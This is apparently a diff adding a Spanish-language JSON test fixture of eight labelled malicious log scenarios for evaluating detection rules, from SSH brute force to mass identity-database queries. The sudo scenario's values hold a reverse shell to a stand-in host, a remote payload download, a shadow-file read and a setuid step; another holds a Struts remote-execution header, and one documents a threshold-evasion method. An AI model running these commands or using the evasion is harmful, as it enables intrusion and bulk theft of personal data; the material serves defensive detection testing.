@@ -1,0 +1,178 @@
+{
+  "descripcion": "Ocho escenarios etiquetados como maliciosos del corpus del apartado 6.5.1. Siete reproducen la señal que cada regla evaluada busca; el octavo es el falso negativo documentado: una consulta masiva al SID distribuida entre varias entidades de origen, de modo que ninguna alcanza el umbral por separado.",
+  "etiqueta": "malicioso",
+  "tokens": {
+    "<<N>>": "indice del evento dentro del bloque, base 1",
+    "<<N6>>": "el mismo indice, rellenado con ceros a seis digitos",
+    "<<IP>>": "el campo ip del bloque",
+    "<<PUERTO>>": "40000 + indice, para variar el puerto de origen",
+    "<<VALOR>>": "recorre ciclicamente la lista valores del bloque"
+  },
+  "escenarios": [
+    {
+      "id": "MAL-01",
+      "nombre": "Fuerza bruta SSH sostenida contra una cuenta de servicio",
+      "etiqueta": "malicioso",
+      "regla_asociada": "Fuerza bruta SSH",
+      "resultado_esperado": "verdadero_positivo",
+      "justificacion": "Nueve autenticaciones fallidas consecutivas desde una unica direccion superan el umbral de seis dentro de la ventana de 300 s.",
+      "host": "server1",
+      "archivo": "auth",
+      "proceso": "sshd",
+      "bloques": [
+        {
+          "plantilla": "Failed password for deploy from <<IP>> port <<PUERTO>> ssh2",
+          "ip": "203.0.113.45",
+          "repeticiones": 9,
+          "intervalo_s": 1.0,
+          "offset_s": 0.0
+        }
+      ]
+    },
+    {
+      "id": "MAL-02",
+      "nombre": "Intento de autenticacion como root desde el exterior",
+      "etiqueta": "malicioso",
+      "regla_asociada": "Intento login root",
+      "resultado_esperado": "verdadero_positivo",
+      "justificacion": "La regla de login root tiene umbral unitario: un solo intento fallido contra la cuenta privilegiada ya constituye la deteccion.",
+      "host": "server1",
+      "archivo": "auth",
+      "proceso": "sshd",
+      "bloques": [
+        {
+          "plantilla": "Failed password for root from <<IP>> port <<PUERTO>> ssh2",
+          "ip": "198.51.100.23",
+          "repeticiones": 3,
+          "intervalo_s": 2.0,
+          "offset_s": 0.0
+        }
+      ]
+    },
+    {
+      "id": "MAL-03",
+      "nombre": "Abuso de sudo desde una cuenta de servicio comprometida",
+      "etiqueta": "malicioso",
+      "regla_asociada": "Uso sospechoso de sudo",
+      "resultado_esperado": "verdadero_positivo",
+      "justificacion": "Catorce elevaciones de privilegio en pocos segundos superan el umbral de diez de la ventana de 600 s. Los registros de sudo no transportan direccion de origen, de modo que la entidad de agrupamiento es la del propio host.",
+      "host": "server1",
+      "archivo": "auth",
+      "proceso": "sudo",
+      "bloques": [
+        {
+          "plantilla": "svc_backup : TTY=pts/2 ; PWD=/home/svc_backup ; USER=root ; COMMAND=/bin/<<VALOR>>",
+          "valores": ["cat /etc/shadow", "nc -e /bin/sh reverse.example 4444", "wget http://payload.example/p.sh", "chmod +s /bin/bash"],
+          "repeticiones": 14,
+          "intervalo_s": 0.8,
+          "offset_s": 0.0
+        }
+      ]
+    },
+    {
+      "id": "MAL-04",
+      "nombre": "Escaneo de puertos desde un host externo",
+      "etiqueta": "malicioso",
+      "regla_asociada": "Escaneo puertos",
+      "resultado_esperado": "verdadero_positivo",
+      "justificacion": "Treinta paquetes descartados por el firewall desde una misma direccion superan ampliamente el umbral de cinco.",
+      "host": "firewall",
+      "archivo": "syslog",
+      "proceso": "kernel",
+      "bloques": [
+        {
+          "plantilla": "iptables DROP: IN=eth0 OUT= MAC=00:00:00:00:00:00 SRC=<<IP>> DST=192.168.1.1 PROTO=TCP DPT=<<PUERTO>> SYN",
+          "ip": "192.0.2.77",
+          "repeticiones": 30,
+          "intervalo_s": 0.3,
+          "offset_s": 0.0
+        }
+      ]
+    },
+    {
+      "id": "MAL-05",
+      "nombre": "Enumeracion automatizada de rutas sensibles del servidor web",
+      "etiqueta": "malicioso",
+      "regla_asociada": "Escaneo directorios web",
+      "resultado_esperado": "verdadero_positivo",
+      "justificacion": "Quince peticiones a rutas caracteristicas de herramientas de enumeracion, todas respondidas con 404, superan el umbral de tres.",
+      "host": "webserver",
+      "archivo": "syslog",
+      "proceso": "nginx",
+      "bloques": [
+        {
+          "plantilla": "<<IP>> - - GET /<<VALOR>> 404 1234 \"-\" \"Mozilla/5.0 (compatible; scanner)\"",
+          "ip": "192.0.2.140",
+          "valores": ["wp-admin/install.php", "phpmyadmin/index.php", ".env", "admin/config.php", "wp-admin/setup-config.php"],
+          "repeticiones": 15,
+          "intervalo_s": 0.4,
+          "offset_s": 0.0
+        }
+      ]
+    },
+    {
+      "id": "MAL-06",
+      "nombre": "Consulta masiva al servicio SID (caso RENAPER)",
+      "etiqueta": "malicioso",
+      "regla_asociada": "Consulta masiva SID",
+      "resultado_esperado": "verdadero_positivo",
+      "justificacion": "Cuarenta consultas por numero de documento desde una unica credencial y una unica direccion superan el umbral de diez de la ventana de 300 s. Es la señal observable del caso documentado en el Capitulo 2.",
+      "host": "sid-server",
+      "archivo": "syslog",
+      "proceso": "sid",
+      "bloques": [
+        {
+          "plantilla": "Query SID: DNI=30<<N6>>, Sexo=F, User=usr_salud_001 from <<IP>>",
+          "ip": "10.20.30.40",
+          "repeticiones": 40,
+          "intervalo_s": 0.25,
+          "offset_s": 0.0
+        }
+      ]
+    },
+    {
+      "id": "MAL-07",
+      "nombre": "Explotacion de Apache Struts CVE-2017-5638 (caso Equifax)",
+      "etiqueta": "malicioso",
+      "regla_asociada": "Explotación web Apache Struts",
+      "resultado_esperado": "verdadero_positivo",
+      "justificacion": "La invocacion de runtime.exec dentro de un encabezado de la peticion es suficiente por si sola: la regla tiene umbral unitario porque un unico intento exitoso ya implica ejecucion remota de codigo.",
+      "host": "web01",
+      "archivo": "syslog",
+      "proceso": "nginx",
+      "bloques": [
+        {
+          "plantilla": "<<IP>> - - \"GET /struts2-showcase/index.action HTTP/1.1\" 200 X-Handler: ${${runtime.exec(\"whoami\")}}",
+          "ip": "203.0.113.99",
+          "repeticiones": 1,
+          "intervalo_s": 1.0,
+          "offset_s": 0.0
+        }
+      ]
+    },
+    {
+      "id": "MAL-08",
+      "nombre": "Consulta masiva al SID distribuida entre varias credenciales",
+      "etiqueta": "malicioso",
+      "regla_asociada": "Consulta masiva SID",
+      "resultado_esperado": "falso_negativo",
+      "justificacion": "FALSO NEGATIVO DOCUMENTADO. Veintisiete consultas al SID repartidas entre nueve direcciones de origen: el volumen agregado es el de una extraccion masiva, pero ninguna entidad llega por si sola a las diez consultas del umbral. El agrupamiento por entidad, que es lo que evita atribuir a una sola IP la actividad de muchas, es tambien lo que abre esta evasion.",
+      "host": "sid-server",
+      "archivo": "syslog",
+      "proceso": "sid",
+      "bloques": [
+        {
+          "plantilla": "Query SID: DNI=41<<N6>>, Sexo=M, User=usr_ext_<<N>> from <<VALOR>>",
+          "valores": [
+            "10.20.31.11", "10.20.31.12", "10.20.31.13",
+            "10.20.31.14", "10.20.31.15", "10.20.31.16",
+            "10.20.31.17", "10.20.31.18", "10.20.31.19"
+          ],
+          "repeticiones": 27,
+          "intervalo_s": 0.5,
+          "offset_s": 0.0
+        }
+      ]
+    }
+  ]
+}
